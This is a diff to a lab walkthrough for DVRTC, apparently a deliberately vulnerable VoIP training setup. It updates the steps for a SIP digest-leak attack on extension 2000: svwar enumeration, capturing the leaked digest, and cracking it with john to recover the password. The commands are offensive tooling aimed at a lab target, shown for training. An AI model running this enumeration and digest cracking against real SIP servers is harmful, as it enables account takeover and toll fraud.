@@ -6,7 +6,7 @@ Exploit the digest leak on extension `2000` by challenging an in-dialog `BYE`, c
 
 ## Prerequisites
 
-- DVRTC running: `docker compose up -d`
+- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
 - `sipvicious_svwar`, `digestleak`, and `john` available in the `attacker` service
 
 ## Steps
@@ -16,7 +16,7 @@ Exploit the digest leak on extension `2000` by challenging an in-dialog `BYE`, c
 Run on the host:
 
 ```bash
-docker compose run --rm -it attacker bash
+./scripts/compose.sh --scenario pbx1 run --rm attacker bash
 cd /work
 ```
 
@@ -32,7 +32,7 @@ sipvicious_svwar -e 2000 "udp://$PUBLIC_IPV4:5060" -v
 
 Verify that `svwar` identifies extension `2000`.
 
-### Step 3: Run the digest leak attack and save the output locally
+### Step 3: Run the digest leak attack and capture the output
 
 In the attacker shell:
 
@@ -48,10 +48,10 @@ The output file is written to `artifacts/digestleak-output.txt` in the repositor
 In the attacker shell:
 
 ```bash
-grep -E 'DIGEST LEAK SUCCESSFUL|^\$sip\$' digestleak-output.txt
+grep -E 'completed successfully|^\$sip\$' digestleak-output.txt
 ```
 
-You should see a successful leak message and a `$sip$*...` line in `john`'s SIP format.
+You should see the final success line and a `$sip$*...` line in `john`'s SIP format.
 
 Extract the hash into its own file:
 
@@ -75,6 +75,7 @@ In the attacker shell:
 
 ```bash
 john --format=SIP digest-hash-john.txt --wordlist=candidates.txt
+exit
 ```
 
 In this lab, the verified `john` workflow recovers the password `2000`.
